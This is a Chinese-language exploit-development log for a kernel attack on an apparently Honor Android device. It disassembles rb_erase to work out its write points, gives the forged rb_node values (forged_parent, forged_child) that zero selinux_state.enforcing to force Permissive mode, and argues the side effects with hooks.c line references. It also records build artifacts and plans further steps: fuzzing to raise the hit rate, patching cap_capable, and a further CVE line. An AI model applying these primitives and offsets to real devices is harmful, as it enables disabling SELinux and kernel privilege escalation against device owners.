# H88 · rb_erase 三写点语义定案与 selinux_state.enforcing 直打

> 轮次：2026-10-04 22:15–22:45 · 产物 `analysis/scratch/f77_h88_20261004_224256`
> 前序：`analysis/output/h84_selinux_enforcing.md`（enforcing 偏移 = ss+0x0 三环闭合）
> 本文档推翻前序两轮的若干结论，是 L1 线迄今**最重要的方法论修正**。

---

## 0. 一句话结论

`rb_erase` 有**三个**写点，此前 18轮一直只认一个，导致 H85/H87 两版 selinux 直打代码**方向性错误**。
按三写点真实语义重做后得到唯一安全解：`forged_parent = alias(ss) - 8`、`forged_child = 0`。

---

## 1. ★ 三写点完整语义（本轮最大发现）

### 1.1 汇编实测（capstone / Image-mey，`file_off = vaddr − 0xffffffc080000000`）

```
rb_erase@0x3a9d4:
  0x3a9d4: ldp  x8, x10, [x0, #8]    x8 = [N+0x08] = N->rb_right
                                    x10 = [N+0x10] = N->rb_left
  0x3a9d8: cbnz x10, 0x3aa18          N->rb_left != 0  -> Path B
  0x3a9dc: ldr  x9, [x0]              x9 = [N+0x00] = N->__rb_parent_color   ★原始值
  0x3a9e0: mov  x11, x1
  0x3a9e4: ands x10, x9, #-4            x10 = pc & ~3      ★只掩码 x10，x9 不变
  0x3a9e8: b.eq 0x3aa00                pc&~3 == 0 -> x11 保持 x1（树根）
  0x3a9ec: mov  x11, x10
  0x3a9f0: ldr  x12, [x11, #0x10]!     x12 = [pc+0x10] ; x11 = pc+0x10
  0x3a9f4: sub  x13, x11, #8            x13 = pc+0x08
  0x3a9f8: cmp  x12, x0[pc+0x10] == N ?
  0x3a9fc: csel x11, x11, x13, eq       eq ? pc+0x10 : pc+0x08
【写点①】0x3aa00: str  x8, [x11]        *(forged_parent + 0x08 或 0x10) = forged_child
  0x3aa04: cbnz x8, 0x3aa10forged_child != 0 -> 去写点②
  0x3aa08: tbnz w9, #0, 0x3aa78
  0x3aa0c: ret
【写点②】0x3aa10: str  x9, [x8]        *(forged_child) = forged_parent
  0x3aa14: ret
```

### 1.2 关键性质（Python 复核，铁律①）

| 项 | 结论 |
|---|---|
| 走写点②的充要条件 | `rb_left == 0` 且 `forged_child != 0` |
| **跳过**写点②的唯一条件 | `forged_child == 0`（`0x3aa04 cbnz x8`） |
| 写点②写入的值 | **原始 pc**（含低 2 位，`x9` 全程未被 `ands` 掩码） |
| 写点①的落点 | `forged_parent + 0x08`（`[fp+0x10] != N` 时）或 `+ 0x10` |
| `forged_parent` 的双重身份 | 既是写点①的**寻址基址**（会被读+写），又是写点②的**写入值** |

### 1.3 f77.c 的伪造布局（`build_misc_fragments`，行 1734-1745）

```
fragment + FAKE_CPU_TIMER_FIRST_OFF(0x78) + i*stride + 0x00 <- forged_parent   (rb_node.pc)
fragment + FAKE_CPU_TIMER_FIRST_OFF(0x78) + i*stride + 0x08 <- forged_child    (rb_node.rb_right)
其余 memset(0)⇒ rb_left = 0                （走Path A 的必要条件，恒满足）
```

---

## 2. ★ H85 / H87 的错误复盘

| 版本 | 赋值 | 实际执行 | 结局 |
|---|---|---|---|
| **H85** | `forged_parent = alias(ss)`<br>`forged_child = 0x100` | 写点①落点 = `ss+0x8`（policycap[6]）<br>写点② 写 `[0x100]` | 落点偏 +8，且低地址 oops |
| **H87** | `forged_parent = alias(ss) − 8`<br>`forged_child = 0x100` | 写点①落点 = `ss+0x0` ✅<br>写点② 写 `[0x100] = alias(ss)−8` | 落点对了，但**低地址 0x100 oops** |
| **H88** | `forged_parent = alias(ss) − 8`<br>`forged_child = 0` | 写点①: `[ss+0x0] = 0` ✅<br>写点② **被跳过** | 唯一安全解 |

**共同根因**：两版都把 `forged_child` 当成「写入的值」，而它在写点②里是**地址**。

---

## 3. ★ 连带推翻 H78 的「W1 根因」

H78 结论：*「`forged_parent = &misc_list − 8` 令写落在 list_head 之前，内核从不读⇒ 写入成功但永不生效 ⇒ 应改 `off_delta = 0`」*

按写点①真实落点（`fp + 0x08`）复算（Python 复核）：

| `off_delta` | `forged_parent` | 写点①落点 | 判定 |
|---|---|---|---|
| **−8**（H78 声称的错） | `alias(misc_list) − 8` | **`&misc_list`**（`.next` 槽） | ✅ **正确** |
| **0**（H78 的修法，H79 实测） | `alias(misc_list)` | `&misc_list + 0x08`（`.prev` 槽） | ❌ 反而错 |

⇒ **H78 根因结论作废；H79 实测的 `off_delta=0` 注定 MISS。`off_delta` 必须保持 −8。**

同时这一修正**反向印证了 stage0**：stage0 的 boot_id 劫持正是靠写点①
（落点 `direct_bootid_parent + 0x08` = `ctl_table.data` 槽）生效，
f77.c 行 366 的注释「W1: `*(parent+0x08) = forged_child` ⇒ 把 ctl_table.data 从 sysctl_bootid 换成 P0alias(cycleC)」
**语义完全正确**——它描述的就是写点①。

---

## 4. ★★ `text=90b0292a` 的真相（H78 曾判其为「无意义截断」，本轮推翻）

H78 判定：*「`STAGEB_STAGE0_CHANNEL ... text=90b0292a` 不是判据，是 `f77.c:2255` 的 `%.8s` 截断，恒定不变」*

本轮设备实测（boot 被写坏后）：

```
设备真实 boot_id = 90b0292a-80ff-ffff-d0d5-d7d6d0ffffff
日志text= 90b0292a                ← 前 8 字符，完全吻合
日志 q0         = 0xffffff802a29b090
q0 小端 8 字节  = 90 b0 29 2a 80 ff ff ff   ← 正是 boot_id 前 8 字节
```

⇒ `text=90b0292a` 是**内核 boot_id 被stage0 写原语写坏后的真实读回**，是**有效判据**。
⇒ 且它是 **stage0 写原语生效的直接铁证**（本次不是 H50 的 `0xff` 模式，而是自指地址模式）。

---

## 5. H88 方案与副作用论证

### 5.1 赋值

```c
forged_parent = enforce_alias - 8;   /* = 0xffffff802a3ba410；pc&~3 低2位=0 */
forged_child  = 0;                   /* 0x3aa04 cbnz 跳过写点② */
```

### 5.2 净效果

```
写点①:  *(ss − 8 + 0x08) = [ss + 0x00] = fc = 0
  ss+0x0 enforcing    = 0   ← ★ Permissive
  ss+0x1 initialized  = 0   （副作用，见5.3）
  ss+0x2..0x7 policycap[0..5] = 0
写点②:  跳过（fc == 0）
后续:    0x3aa08 tbnz w9,#0 不跳（fp 低2位=0）→ 0x3aa0c ret
⇒ 一次 rb_erase 完成，零第二个副作用
```

### 5.3 `initialized = 0` 的后果（源码实证，非推测）

| 检查项 | 结论 |
|---|---|
| `avc.c` 是否检查 `selinux_initialized` | **完全不含**（grep 无命中）⇒ avc 仍正常判定，不崩 |
| `hooks.c` 中检查它的 hook | 187 个中仅 **12 处**（行 283/644/926/1002/1079/2929/2955/3190/3294/3347/3417/3484），形如 `if (!selinux_initialized()) return 0;` |
| 这 12 处在 `initialized == 0` 时 | **无条件 `return 0` = 放行** ⇒ SELinux 更弱，不崩 |
| `selinuxfs.c` 是否检查 | **无命中**；`sel_read_enforce` 只读 `enforcing_enabled()` |
| ⇒ 判据有效性 | `getenforce` / `/sys/fs/selinux/enforce` **依然有效** |
| ⇒ 规程 §一 达成度 | `getenforce ≠ Enforcing` **已达成**（该条是终态标尺的一半） |

`policycap[0..5]` 清零的后果（`hooks.c` 实证，全部为「更保守」方向）：
- 行 3715 `if (!selinux_policycap_ioctl_skip_cloexec())` → **仍调** `ioctl_has_perm`（更严）
- 行 5099/5661/5795 `if (!selinux_policycap_netpeer())` → 走 `selinux_sock_rcv_skb_compat()` 兼容路径
- 行 1512/2009/3143 openperm / genfs 条件 → 走fallback

### 5.4 被否决的备选（留待 H89）

写点②的写入值是**原始 pc（含低 2 位）**，故若`forged_parent & 0xFFFF == 0x0100`
且它是可读写内核地址，可得 `enforcing = 0` + `initialized = 1`。
但写点①会污染 `fp + 0x08`（= `ss + 0x108`，邻近 `status_lock`/`policy` 指针）⇒ 崩溃风险高，本轮不采用。

---

## 6. 三环对照表

| 对象/函数 | 源码推断（r17，权威基线） | 汇编实测（Image-mey） | img 反汇编差异 | 一致性 | 矛盾待解项 |
|---|---|---|---|---|---|
| `rb_erase` 写点① | `__rb_change_child()`：改父节点的 child 指针 | `0x3aa00: str x8,[x11]`，`x11 ∈ {fp+0x08, fp+0x10}` 由 `csel` 选 | — | ✅ | — |
| `rb_erase` 写点② | `child->__rb_parent_color = pc`（rb_erase Case 1） | `0x3aa10: str x9,[x8]`，`x9` 为原始 pc 未掩码 | — | ✅ | — |
| `struct selinux_state` 布局 | `security.h:92-106` 声明顺序 | `h84_enforcing_final.py` 8 字段全吻合，`__randomize_layout` 未生效 | — | ✅ | — |
| `enforcing_enabled()` | `READ_ONCE(ss.enforcing)`，仅 `CONFIG_SECURITY_SELINUX_DEVELOP=y` 时活 | 设备 `/proc/config.gz` 实测 =`y` | — | ✅ | — |
| `avc_denied()` 放行条件 | `if (enforcing_enabled() && !PERMISSIVE) return -EACCES` | `h84_crosscheck.py` V2 `ldarb` + `tbnz #0` 形态吻合 | — | ✅ | — |
| `sel_read_enforce` 判据可靠性 | 只读 `enforcing_enabled()`，无 `initialized` 检查 | — | — | ✅ | — |
| `ctl_table` 布局 | `{procname@0, data@8}` | stage0 写点①落点 `fp+8` 恰为 `.data` | — | ✅ | — |

---

## 7. 本轮产物

| 路径 | 说明 |
|---|---|
| `tools/h87_patch.py` | 减 8 修正（方向仍错，保留作历史） |
| `tools/h88_patch.py` | 三写点语义重做，9/9 自检通过 |
| `c64560/f77.c` | 345,514 → 348,328 B；备份 `.bak_h87`(346,987) `.bak_h88` |
| `analysis/scratch/f77_h88_20261004_224256` | 2,389,488 B，ELF `7f 45 4c 46`，零编译错误 |
| `analysis/scratch/h88_run_*.log` | 单发实测日志 |

---

## 8. 新增铁律

**㉝ `rb_erase` 类写原语必须逐条反汇编枚举【全部】写点，不得只认第一个 `str`。**
每个写点的「落点 / 值 / 门控条件」三者都要独立标注；门控条件（如 `cbnz`）往往正是
规避副作用的唯一手段（本轮 `fc == 0` 即靠它跳过写点②）。

**㉞ 伪造 `__rb_parent_color` 的变量有【双重身份】：既是 `__rb_change_child` 的寻址基址
（会被 `ldr [x+0x10]` 读、被 `str [x]` 写），又是另个写点的写入值。**
⇒ 它**必须是真实的可读写内核地址**，不能填小整数（否则内核态访问低地址直接 oops）。

**㉟ `ands x10, x9, #-4` 只掩码副本 `x10`，`x9` 全程保持原始 pc。**
⇒ 靠写点② 送入的值可以带低 2 位（rb color 位），这是绕过「值必须 8 字节精确匹配」的
潜在杠杆（留作 H89 备选）。

---

## 9. 下一轮待办

1. **H88 实测判据**：`getenforce` = `Permissive` ⇒ 达成规程 §一 一半；`NO_HIT` ⇒ 提高 stage0 命中率（1/127）；`REBOOTED` ⇒ 查 `ATTEMPT_MISS` 深度。
2. 若 PASS：H89 补 `initialized=1`（用㉟ 的低2位杠杆），或转 `cap_capable` NOP（H49 `probe_text_write` 代码已就位）。
3. **重跑 W1 桥接**：`off_delta` 必须用 `-8`（H79 的 `0` 是错的），这是 W1 从未成功的新解释。
4. **stage0 命中率仍是根本瓶颈**（1/127）：`timer_goal`/`pipe_count`/`irq_arm_lead_ns`/`spray_mode` 系统化 fuzzing。
5. 修正 `MEMORY.md` 中 H78 的 W1 根因结论与 `text=90b0292a` 判据（两项均已作废）。
6. A2 线：审计 `vendor/honor/system`。
7. L2（CVE-2026-43499 `rt_mutex`）与规程「副线·重新激活」对齐。